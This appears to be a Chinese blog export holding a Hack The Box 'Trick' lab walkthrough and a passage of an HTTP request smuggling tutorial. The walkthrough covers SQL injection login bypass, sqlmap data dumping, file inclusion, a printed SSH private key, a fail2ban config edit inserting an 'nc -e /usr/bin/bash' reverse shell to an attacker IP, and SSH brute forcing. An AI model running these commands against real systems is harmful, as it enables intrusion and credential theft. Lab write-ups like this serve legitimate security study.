<p><img src="/2022/10/08/htb-trick/%25E6%2588%25AA%25E5%25B1%258F2022-08-29_20.45.07.png" alt="截屏2022-08-29 20.45.07.png"></p>
<p>dig查看一下，发现preprod-payroll.trick.htb</p>
<p><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-dns">53 - Pentesting DNS</a></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">dig axfr trick<span class="token punctuation">.</span>htb <span class="token annotation punctuation">@10.10.11.166</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/2022/10/08/htb-trick/%25E6%2588%25AA%25E5%25B1%258F2022-08-31_12.09.35.png" alt="截屏2022-08-31 12.09.35.png"></p>
<p>Fuzz一下有没有其他子域名</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">ffuf <span class="token operator">-</span>u http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>trick<span class="token punctuation">.</span>htb <span class="token operator">-</span>w <span class="token operator">/</span>usr<span class="token operator">/</span>share<span class="token operator">/</span>wordlists<span class="token operator">/</span><span class="token class-name">SecLists</span><span class="token operator">/</span><span class="token class-name">Discovery</span><span class="token operator">/</span><span class="token constant">DNS</span><span class="token operator">/</span>subdomains<span class="token operator">-</span>top1million<span class="token operator">-</span><span class="token number">5000.</span>txt <span class="token operator">-</span><span class="token class-name">H</span> '<span class="token class-name">Host</span><span class="token operator">:</span> preprod<span class="token operator">-</span><span class="token constant">FUZZ</span><span class="token punctuation">.</span>trick<span class="token punctuation">.</span>htb' <span class="token operator">-</span>fw <span class="token number">1697</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/2022/10/08/htb-trick/%25E6%2588%25AA%25E5%25B1%258F2022-08-31_21.04.06.png" alt="截屏2022-08-31 21.04.06.png"></p>
<p>发现一个preprod-marketing.trick.htb，添加到hosts</p>
<p><img src="/2022/10/08/htb-trick/%25E6%2588%25AA%25E5%25B1%258F2022-08-31_21.04.56.png" alt="截屏2022-08-31 21.04.56.png"></p>
<p>打开页面，只有一个登录窗口，尝试弱口令，未成功</p>
<p><img src="/2022/10/08/htb-trick/%25E6%2588%25AA%25E5%25B1%258F2022-08-31_12.31.19.png" alt="截屏2022-08-31 12.31.19.png"></p>
<p>尝试万能密码，成功进入后台</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">admin' or <span class="token class-name">True</span> <span class="token operator">--</span> <span class="token operator">-</span>
admin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="/2022/10/08/htb-trick/%25E6%2588%25AA%25E5%25B1%258F2022-08-31_19.19.08.png" alt="截屏2022-08-31 19.19.08.png"></p>
<p>在Users→Action→edit,使用F12大法可以看到密码：</p>
<p><img src="/2022/10/08/htb-trick/%25E6%2588%25AA%25E5%25B1%258F2022-08-31_19.50.08.png" alt="截屏2022-08-31 19.50.08.png"></p>
<p>在employee界面添加成员并抓包</p>
<p><img src="/2022/10/08/htb-trick/%25E6%2588%25AA%25E5%25B1%258F2022-08-31_19.22.25.png" alt="截屏2022-08-31 19.22.25.png"></p>
<p>抓包如下：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token constant">POST</span> <span class="token operator">/</span>ajax<span class="token punctuation">.</span>php<span class="token operator">?</span>action<span class="token operator">=</span>save_employee <span class="token constant">HTTP</span><span class="token operator">/</span><span class="token number">1.1</span>
<span class="token class-name">Host</span><span class="token operator">:</span> preprod<span class="token operator">-</span>payroll<span class="token punctuation">.</span>trick<span class="token punctuation">.</span>htb
<span class="token class-name">User</span><span class="token operator">-</span><span class="token class-name">Agent</span><span class="token operator">:</span> <span class="token class-name">Mozilla</span><span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span><span class="token constant">X11</span><span class="token punctuation">;</span> <span class="token class-name">Linux</span> x86_64<span class="token punctuation">;</span> rv<span class="token operator">:</span><span class="token number">91.0</span><span class="token punctuation">)</span> <span class="token class-name">Gecko</span><span class="token operator">/</span><span class="token number">20100101</span> <span class="token class-name">Firefox</span><span class="token operator">/</span><span class="token number">91.0</span>
<span class="token class-name">Accept</span><span class="token operator">:</span> <span class="token operator">*</span><span class="token comment">/*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 93
Origin: http://preprod-payroll.trick.htb
Connection: close
Referer: http://preprod-payroll.trick.htb/index.php?page=employee
Cookie: PHPSESSID=sge9952plnojhbr5qeobj5ggkv

id=&amp;firstname=l1b3ri&amp;middlename=l1b3ri&amp;lastname=l1b3ri&amp;department_id=2&amp;position_id=2&amp;salary=2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>保存到trick.req，用sqlmap进行扫描尝试：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">sqlmap <span class="token operator">-</span>r employee_sql<span class="token punctuation">.</span>req <span class="token operator">--</span>batch <span class="token operator">--</span>hex <span class="token operator">--</span>dbs
sqlmap <span class="token operator">-</span>r employee_sql<span class="token punctuation">.</span>req <span class="token operator">--</span>batch <span class="token operator">--</span>hex <span class="token operator">-</span><span class="token class-name">D</span> payroll_db <span class="token operator">--</span>tables <span class="token operator">--</span>threads <span class="token number">10</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="/2022/10/08/htb-trick/%25E6%2588%25AA%25E5%25B1%258F2022-08-31_19.45.57.png" alt="截屏2022-08-31 19.45.57.png"></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">sqlmap <span class="token operator">-</span>r employee_sql<span class="token punctuation">.</span>req <span class="token operator">--</span>batch <span class="token operator">--</span>hex <span class="token operator">-</span><span class="token class-name">D</span> payroll_db <span class="token operator">--</span>tables <span class="token operator">--</span>threads <span class="token number">10</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/2022/10/08/htb-trick/%25E6%2588%25AA%25E5%25B1%258F2022-08-31_20.06.23.png" alt="截屏2022-08-31 20.06.23.png"></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">sqlmap <span class="token operator">-</span>r employee_sql<span class="token punctuation">.</span>req <span class="token operator">--</span>batch <span class="token operator">--</span>hex <span class="token operator">-</span><span class="token class-name">D</span> payroll_db <span class="token operator">-</span><span class="token class-name">T</span> users <span class="token operator">--</span><span class="token class-name">Columns</span> <span class="token operator">--</span>threads <span class="token number">10</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/2022/10/08/htb-trick/%25E6%2588%25AA%25E5%25B1%258F2022-08-31_20.30.11.png" alt="截屏2022-08-31 20.30.11.png"></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">sqlmap <span class="token operator">-</span>r employee_sql<span class="token punctuation">.</span>req <span class="token operator">--</span>batch <span class="token operator">--</span>hex <span class="token operator">-</span><span class="token class-name">D</span> payroll_db <span class="token operator">-</span><span class="token class-name">T</span> users <span class="token operator">-</span><span class="token class-name">C</span> name<span class="token punctuation">,</span>id<span class="token punctuation">,</span>password <span class="token operator">--</span>dump <span class="token operator">--</span>threads <span class="token number">10</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/2022/10/08/htb-trick/%25E6%2588%25AA%25E5%25B1%258F2022-08-31_20.34.48.png" alt="截屏2022-08-31 20.34.48.png"></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">sqlmap <span class="token operator">-</span>r employee_sql<span class="token punctuation">.</span>req <span class="token operator">--</span>batch <span class="token operator">--</span>hex <span class="token operator">--</span>current<span class="token operator">-</span>user <span class="token operator">--</span>threads <span class="token number">10</span>
current user<span class="token operator">:</span> 'remo<span class="token annotation punctuation">@localhost</span>’<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>尝试一下文件读取：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">sqlmap <span class="token operator">-</span>r employee_sql<span class="token punctuation">.</span>req <span class="token operator">--</span>batch <span class="token operator">--</span>hex <span class="token operator">--</span>file<span class="token operator">-</span>read<span class="token operator">=</span><span class="token operator">/</span>etc<span class="token operator">/</span>hostname <span class="token operator">--</span>threads <span class="token number">10</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>这时候发现Users界面和Employee List界面的请求</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">?</span>page<span class="token operator">=</span>xxx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>猜测是否含有文件包含？抓包尝试</p>
<p><img src="/2022/10/08/htb-trick/%25E6%2588%25AA%25E5%25B1%258F2022-08-31_19.56.25.png" alt="截屏2022-08-31 19.56.25.png"></p>
<p>FUZZ一下</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">wfuzz <span class="token operator">-</span>w <span class="token operator">/</span>usr<span class="token operator">/</span>share<span class="token operator">/</span>wordlists<span class="token operator">/</span><span class="token class-name">Auto_Wordlists</span><span class="token operator">/</span>wordlists<span class="token operator">/</span>file_inclusion_linux<span class="token punctuation">.</span>txt <span class="token operator">-</span>b cookie<span class="token operator">=</span>sge9952plnojhbr5qeobj5ggkv  <span class="token string">"http://preprod-payroll.trick.htb/index.php?page=FUZZ"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/2022/10/08/htb-trick/%25E6%2588%25AA%25E5%25B1%258F2022-08-31_20.51.22.png" alt="截屏2022-08-31 20.51.22.png"></p>
<p>失败</p>
<p>尝试preprod-marketing.trick.htb</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>preprod<span class="token operator">-</span>marketing<span class="token punctuation">.</span>trick<span class="token punctuation">.</span>htb<span class="token operator">/</span>index<span class="token punctuation">.</span>php<span class="token operator">?</span>page<span class="token operator">=</span>about<span class="token punctuation">.</span>html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>同样尝试fuzz有没有EFI</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">wfuzz <span class="token operator">-</span>w <span class="token operator">/</span>usr<span class="token operator">/</span>share<span class="token operator">/</span>wordlists<span class="token operator">/</span><span class="token class-name">Auto_Wordlists</span><span class="token operator">/</span>wordlists<span class="token operator">/</span>file_inclusion_linux<span class="token punctuation">.</span>txt <span class="token operator">-</span>b cookie<span class="token operator">=</span>sge9952plnojhbr5qeobj5ggkv  <span class="token string">"http://preprod-marketing.trick.htb/index.php?page=FUZZ"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/2022/10/08/htb-trick/%25E6%2588%25AA%25E5%25B1%258F2022-08-31_21.09.29.png" alt="截屏2022-08-31 21.09.29.png"></p>
<p>Successful！</p>
<p><img src="/2022/10/08/htb-trick/%25E6%2588%25AA%25E5%25B1%258F2022-08-31_21.09.57.png" alt="截屏2022-08-31 21.09.57.png"></p>
<p>读一下ssh文件</p>
<p>保存到trick_michael.pri</p>
<p><img src="/2022/10/08/htb-trick/%25E6%2588%25AA%25E5%25B1%258F2022-08-31_21.11.46.png" alt="截屏2022-08-31 21.11.46.png"></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token constant">BEGIN</span> <span class="token constant">OPENSSH</span> <span class="token constant">PRIVATE</span> <span class="token constant">KEY</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
<span class="token class-name">NhAAAAAwEAAQAAAQEAwI9YLFRKT6JFTSqPt2</span><span class="token operator">/</span><span class="token operator">+</span><span class="token number">7</span>mgg5HpSwzHZwu95Nqh1Gu4<span class="token operator">+</span><span class="token number">9</span>P<span class="token operator">+</span>ohLtz
c4jtky6wYGzlxKHg<span class="token operator">/</span><span class="token class-name">Q5ehozs9TgNWPVKh</span><span class="token operator">+</span>j92WdCNPvdzaQqYKxw4Fwd3K7F4JsnZaJk2G
<span class="token class-name">YQ2re</span><span class="token operator">/</span>gTrNElMAqURSCVydx<span class="token operator">/</span><span class="token class-name">UvGCNT9dwQ4zna4sxIZF4HpwRt1T74wioqIX3EAYCCZcf</span><span class="token operator">+</span>
<span class="token number">4</span>gAYBhUQTYeJlYpDVfbbRH2yD73x7NcICp5iIYrdS455nARJtPHYkO9eobmyamyNDgAia<span class="token operator">/</span>
<span class="token class-name">Ukn75SroKGUMdiJHnd</span><span class="token operator">+</span>m1jW5mGotQRxkATWMY5qFOiKglnws<span class="token operator">/</span>jgdxpDV9K3iDTPWXFwtK4
<span class="token number">1</span>kC<span class="token operator">+</span>t4a8sQAAA8hzFJk2cxSZNgAAAAdzc2gtcnNhAAABAQDAj1gsVEpPokVNKo<span class="token operator">+</span><span class="token number">3</span>b<span class="token operator">/</span><span class="token number">7</span>uaC
<span class="token class-name">DkelLDMdnC73k2qHUa7j70</span><span class="token operator">/</span><span class="token number">6</span>iEu3NziO2TLrBgbOXEoeD9Dl6GjOz1OA1Y9UqH6P3ZZ0I0
<span class="token operator">+</span><span class="token number">93</span>NpCpgrHDgXB3crsXgmydlomTYZhDat7<span class="token operator">+</span><span class="token class-name">BOs0SUwCpRFIJXJ3H9S8YI1P13BDjOdrizE</span>
hkXgenBG3VPvjCKiohfcQBgIJlx<span class="token operator">/</span><span class="token number">7</span>iABgGFRBNh4mVikNV9ttEfbIPvfHs1wgKnmIhit1L
jnmcBEm08diQ716hubJqbI0OACJr9SSfvlKugoZQx2Iked36bWNbmYai1BHGQBNYxjmoU6
<span class="token class-name">IqCWfCz</span><span class="token operator">+</span><span class="token class-name">OB3GkNX0reINM9ZcXC0rjWQL63hryxAAAAAwEAAQAAAQASAVVNT9Ri</span><span class="token operator">/</span>dldDc3C
aUZ9JF9u<span class="token operator">/</span>cEfX1ntUFcVNUs96WkZn44yWxTAiN0uFf<span class="token operator">+</span><span class="token class-name">IBKa3bCuNffp4ulSt2T</span><span class="token operator">/</span>mQYlmi<span class="token operator">/</span>
<span class="token class-name">KwkWcvbR2gTOlpgLZNRE</span><span class="token operator">/</span><span class="token class-name">GgtEd32QfrL</span><span class="token operator">+</span>hPGn3CZdujgD<span class="token operator">+</span><span class="token number">5</span>aP6L9k75t0aBWMR7ru7EYjC
tnYxHsjmGaS9iRLpo79lwmIDHpu2fSdVpphAmsaYtVFPSwf01VlEZvIEWAEY6qv7r455Ge
<span class="token class-name">U</span><span class="token operator">+</span><span class="token number">38</span>O714987fRe4<span class="token operator">+</span>jcfSpCTFB0fQkNArHCKiHRjYFCWVCBWuYkVlGYXLVlUcYVezS<span class="token operator">+</span>ouM0
fHbE5GMyJf6<span class="token operator">+</span><span class="token operator">/</span><span class="token number">8</span>P06MbAdZ1<span class="token operator">+</span><span class="token number">5</span>nWRmdtLOFKF1rpHh43BAAAAgQDJ6xWCdmx5DGsHmkhG1V
<span class="token constant">PH</span><span class="token operator">+</span><span class="token number">7</span><span class="token operator">+</span><span class="token class-name">Oono2E7cgBv7GIqpdxRsozETjqzDlMYGnhk9oCG8v8oiXUVlM0e4jUOmnqaCvdDTS</span>
<span class="token number">3</span>AZ4FVonhCl5DFVPEz4UdlKgHS0LZoJuz4yq2YEt5DcSixuS<span class="token operator">+</span><span class="token class-name">Nr3aFUTl3SxOxD7T4tKXA</span>
fvjlQQh81veQAAAIEA6UE9xt6D4YXwFmjKo<span class="token operator">+</span><span class="token number">5</span>KQpasJquMVrLcxKyAlNpLNxYN8LzGS0sT
<span class="token class-name">AuNHUSgX</span><span class="token operator">/</span>tcNxg1yYHeHTu868<span class="token operator">/</span><span class="token class-name">LUTe8l3Sb268YaOnxEbmkPQbBscDerqEAPOvwHD9rrgn</span>
<span class="token class-name">In16n3kMFSFaU2bCkzaLGQ</span><span class="token operator">+</span>hoD5QJXeVMt6a<span class="token operator">/</span><span class="token number">5</span>ztUWQZCJXkcAAACBANNWO6MfEDxYr9DP
<span class="token class-name">JkCbANS5fRVNVi0Lx</span><span class="token operator">+</span><span class="token class-name">BSFyEKs2ThJqvlhnxBs43QxBX0j4BkqFUfuJ</span><span class="token operator">/</span><span class="token class-name">YzySvfVNPtSb0XN</span>
jsj51hLkyTIOBEVxNjDcPWOj5470u21X8qx2F3M4<span class="token operator">+</span><span class="token constant">YGGH</span><span class="token operator">+</span>mka7P<span class="token operator">+</span><span class="token class-name">VVfvJDZa67XNHzrxi</span><span class="token operator">+</span>
<span class="token class-name">IJhaN0D5bVMdjjFHAAAADW1pY2hhZWxAdHJpY2sBAgMEBQ</span><span class="token operator">==</span>
<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token constant">END</span> <span class="token constant">OPENSSH</span> <span class="token constant">PRIVATE</span> <span class="token constant">KEY</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2022/10/08/htb-trick/%25E6%2588%25AA%25E5%25B1%258F2022-08-31_21.26.55.png" alt="截屏2022-08-31 21.26.55.png"></p>
<p>linpeas扫一下</p>
<p><img src="/2022/10/08/htb-trick/%25E6%2588%25AA%25E5%25B1%258F2022-08-31_21.29.36.png" alt="截屏2022-08-31 21.29.36.png"></p>
<p>第一部分flag</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token number">280503</span>ef44e47dc5d1f7c402eb65009f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>尝试了几个提权都失败了</p>
<p><img src="/2022/10/08/htb-trick/%25E6%2588%25AA%25E5%25B1%258F2022-08-31_21.45.15.png" alt="截屏2022-08-31 21.45.15.png"></p>
<p><a href="https://youssef-ichioui.medium.com/abusing-fail2ban-misconfiguration-to-escalate-privileges-on-linux-826ad0cdafb7">Abusing Fail2ban misconfiguration to escalate privileges on Linux</a></p>
<p><img src="/2022/10/08/htb-trick/%25E6%2588%25AA%25E5%25B1%258F2022-08-31_21.56.10.png" alt="截屏2022-08-31 21.56.10.png"></p>
<p>可以看到action.d具有写权限，文章中提示需要将iptables-multiport.conf文件进行复制修改</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">vim iptables<span class="token operator">-</span>multiport<span class="token punctuation">.</span>conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/2022/10/08/htb-trick/%25E6%2588%25AA%25E5%25B1%258F2022-08-31_22.03.07.png" alt="截屏2022-08-31 22.03.07.png"></p>
<p>修改</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">/</span>usr<span class="token operator">/</span>bin<span class="token operator">/</span>nc <span class="token number">10.10</span><span class="token number">.16</span><span class="token number">.23</span> <span class="token number">1337</span> <span class="token operator">-</span>e <span class="token operator">/</span>usr<span class="token operator">/</span>bin<span class="token operator">/</span>bash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/2022/10/08/htb-trick/%25E6%2588%25AA%25E5%25B1%258F2022-08-31_22.09.12.png" alt="截屏2022-08-31 22.09.12.png"></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">mv iptables<span class="token operator">-</span>multiport<span class="token punctuation">.</span>conf <span class="token operator">/</span>etc<span class="token operator">/</span>fail2ban<span class="token operator">/</span>action<span class="token punctuation">.</span>d<span class="token operator">/</span>
tail <span class="token operator">-</span>n <span class="token number">20</span> <span class="token operator">/</span>etc<span class="token operator">/</span>fail2ban<span class="token operator">/</span>action<span class="token punctuation">.</span>d<span class="token operator">/</span>iptables<span class="token operator">-</span>multiport<span class="token punctuation">.</span>conf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="/2022/10/08/htb-trick/%25E6%2588%25AA%25E5%25B1%258F2022-08-31_22.16.12.png" alt="截屏2022-08-31 22.16.12.png"></p>
<p>通过ssh链接失败来触发</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">patator ssh_login host<span class="token operator">=</span>trick user<span class="token operator">=</span><span class="token class-name">FILE0</span> password<span class="token operator">=</span><span class="token class-name">FILE1</span> <span class="token number">0</span><span class="token operator">=</span><span class="token operator">/</span>usr<span class="token operator">/</span>share<span class="token operator">/</span>wordlists<span class="token operator">/</span><span class="token class-name">SecLists</span><span class="token operator">/</span><span class="token class-name">Usernames</span><span class="token operator">/</span><span class="token class-name">Names</span><span class="token operator">/</span>familynames<span class="token operator">-</span>usa<span class="token operator">-</span>top1000<span class="token punctuation">.</span>txt <span class="token number">1</span><span class="token operator">=</span><span class="token operator">/</span>usr<span class="token operator">/</span>share<span class="token operator">/</span>wordlists<span class="token operator">/</span><span class="token class-name">SecLists</span><span class="token operator">/</span><span class="token class-name">Passwords</span><span class="token operator">/</span><span class="token number">500</span><span class="token operator">-</span>worst<span class="token operator">-</span>passwords<span class="token punctuation">.</span>txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>连接成功</p>
<p><img src="/2022/10/08/htb-trick/%25E6%2588%25AA%25E5%25B1%258F2022-08-31_22.49.37.png" alt="截屏2022-08-31 22.49.37.png"></p>
]]></content>
      <categories>
        <category>HTB</category>
      </categories>
      <tags>
        <tag>博客</tag>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>HTTP-request-smuggling</title>
    <url>/2022/10/08/http-request-smuggling/</url>
    <content><![CDATA[<h1 id="HTTP-request-smuggling-一"><a href="#HTTP-request-smuggling-一" class="headerlink" title="HTTP-request-smuggling(一)"></a>HTTP-request-smuggling(一)</h1><p><a href="https://www.blackhat.com/us-22/briefings/schedule/#browser-powered-desync-attacks-a-new-frontier-in-http-request-smuggling-26414">Black Hat USA 2022</a></p>
<p><a href="https://www.blackhat.com/us-20/briefings/schedule/#http-request-smuggling-in---new-variants-new-defenses-and-new-challenges-20019">Black Hat USA 2020</a></p>
<p>实用工具：</p>
<p><a href="https://github.com/defparam/smuggler">https://github.com/defparam/smuggler</a></p>
<p><a href="https://hackbotone.com/blog/http-request-smuggling-detection-tool">https://hackbotone.com/blog/http-request-smuggling-detection-tool</a></p>
<p>具体什么是HTTP请求走私我就不重复了，国内很多文章已经写的很通透了</p>
<h2 id="如何寻找HTTP请求走私漏洞"><a href="#如何寻找HTTP请求走私漏洞" class="headerlink" title="如何寻找HTTP请求走私漏洞"></a>如何寻找HTTP请求走私漏洞</h2><h3 id="1-使用计时技术"><a href="#1-使用计时技术" class="headerlink" title="1.使用计时技术"></a>1.使用计时技术</h3><p>因为前后端采用的标头不同以及前端仅转发请求的一部分，而在后端处理数据包的时候在等待其余内容或者块到达的时候会导致明显的时间延迟</p>
<h3 id="使用计时技术寻找CL-TE漏洞"><a href="#使用计时技术寻找CL-TE漏洞" class="headerlink" title="使用计时技术寻找CL.TE漏洞"></a>使用计时技术寻找CL.TE漏洞</h3><p>如果一个应用程序容易收到CL.TE漏洞的攻击，那么我们发送一个如下的请求就可以造成时间延迟</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">POST <span class="token operator">/</span> HTTP<span class="token operator">/</span><span class="token number">1.1</span>
Host<span class="token punctuation">:</span> vulnerable<span class="token operator">-</span>website<span class="token punctuation">.</span>com
Transfer<span class="token operator">-</span>Encoding<span class="token punctuation">:</span> chunked
Content<span class="token operator">-</span>Length<span class="token punctuation">:</span> <span class="token number">4</span>

<span class="token number">1</span>
A
X<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>由于CL.TE漏洞前端优先检测CL头，前端服务器将把</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token number">1</span>
A<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>优先发送给后端服务器，将X滞留与pipline中，那么下一个请求发送过来时，将会与X进行组合</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">XGET <span class="token operator">/</span>search HTTP<span class="token operator">/</span><span class="token number">1.1</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>将会导致404，可以检测存在CL.TE漏洞</p>
<h3 id="使用计时技术寻找TE-CL漏洞"><a href="#使用计时技术寻找TE-CL漏洞" class="headerlink" title="使用计时技术寻找TE.CL漏洞"></a>使用计时技术寻找TE.CL漏洞</h3><p>如果应用程序存在TE.CL漏洞，那么我们发送如下请求：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">POST <span class="token operator">/</span> HTTP<span class="token operator">/</span><span class="token number">1.1</span>
Host<span class="token punctuation">:</span> vulnerable<span class="token operator">-</span>website<span class="token punctuation">.</span>com
Transfer<span class="token operator">-</span>Encoding<span class="token punctuation">:</span> chunked
Content<span class="token operator">-</span>Length<span class="token punctuation">:</span> <span class="token number">6</span>

<span class="token number">0</span>

X<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>前端优先检测TE：chunked， TE检测到<strong>0\r\n\r\n</strong>认为请求已经结束，后续X存入pipline中，与后续请求拼接在一起导致如下请求：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">XPOST <span class="token operator">/</span> HTTP<span class="token operator">/</span><span class="token number">1.1</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>返回404，存在TE.CL漏洞</p>
<p>！注意：应该先进行CL.TE的测试，再进行TE.CL的测试，因为TE.CL会中断其他用户的请求，导致网站出问题</p>
<h3 id="2-查分响应技术"><a href="#2-查分响应技术" class="headerlink" title="2.查分响应技术"></a>2.查分响应技术</h3><p>当检测到可能的请求走私漏洞时，可以通过利用该漏洞触发响应内容的差异来获得该漏洞的进一步证据。这涉及快速连续地向应用发送两个请求：</p>
<p>· 一个意在干扰下一个正常请求的走私请求</p>
<p>·一个正常请求</p>
<p>如果对相应包含了预期的干扰，则确认有这个漏洞</p>
<p>比如这是一个普通的请求：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">POST <span class="token operator">/</span>search HTTP<span class="token operator">/</span><span class="token number">1.1</span>
Host<span class="token punctuation">:</span> vulnerable<span class="token operator">-</span>website<span class="token punctuation">.</span>com
Content<span class="token operator">-</span>Type<span class="token punctuation">:</span> application<span class="token operator">/</span>x<span class="token operator">-</span>www<span class="token operator">-</span>form<span class="token operator">-</span>urlencoded
Content<span class="token operator">-</span>Length<span class="token punctuation">:</span> <span class="token number">11</span>

q<span class="token operator">=</span>smuggling<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这个请求包含了HTTP返回包的200状态码和一些被搜索到的内容</p>
<h3 id="基于差分相应技术的CL-TE漏洞"><a href="#基于差分相应技术的CL-TE漏洞" class="headerlink" title="基于差分相应技术的CL.TE漏洞"></a>基于差分相应技术的CL.TE漏洞</h3><p>为了去确定CL.TE漏洞，我们可以这样构建一个数据包：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">POST <span class="token operator">/</span>search HTTP<span class="token operator">/</span><span class="token number">1.1</span>
Host<span class="token punctuation">:</span> vulnerable<span class="token operator">-</span>website<span class="token punctuation">.</span>com
Content<span class="token operator">-</span>Type<span class="token punctuation">:</span> application<span class="token operator">/</span>x<span class="token operator">-</span>www<span class="token operator">-</span>form<span class="token operator">-</span>urlencoded
Content<span class="token operator">-</span>Length<span class="token punctuation">:</span> <span class="token number">49</span>
Transfer<span class="token operator">-</span>Encoding<span class="token punctuation">:</span> chunked

e
q<span class="token operator">=</span>smuggling<span class="token operator">&amp;</span>x<span class="token operator">=</span>
<span class="token number">0</span>

GET <span class="token operator">/</span><span class="token number">404</span> HTTP<span class="token operator">/</span><span class="token number">1.1</span>
Foo<span class="token punctuation">:</span> x<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>如果攻击成功执行，前端根据CL确认，则将所有的数据都发送给后端，后端根据TE确认，TE识别到0\r\n\r\n,则将GET /404保存在pipline中，当后续请求传递过来时，将会与之进行拼接</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">GET <span class="token operator">/</span><span class="token number">404</span> HTTP<span class="token operator">/</span><span class="token number">1.1</span>
Foo<span class="token punctuation">:</span> xPOST <span class="token operator">/</span>search HTTP<span class="token operator">/</span><span class="token number">1.1</span>
Host<span class="token punctuation">:</span> vulnerable<span class="token operator">-</span>website<span class="token punctuation">.</span>com
Content<span class="token operator">-</span>Type<span class="token punctuation">:</span> application<span class="token operator">/</span>x<span class="token operator">-</span>www<span class="token operator">-</span>form<span class="token operator">-</span>urlencoded
Content<span class="token operator">-</span>Length<span class="token punctuation">:</span> <span class="token number">11</span>

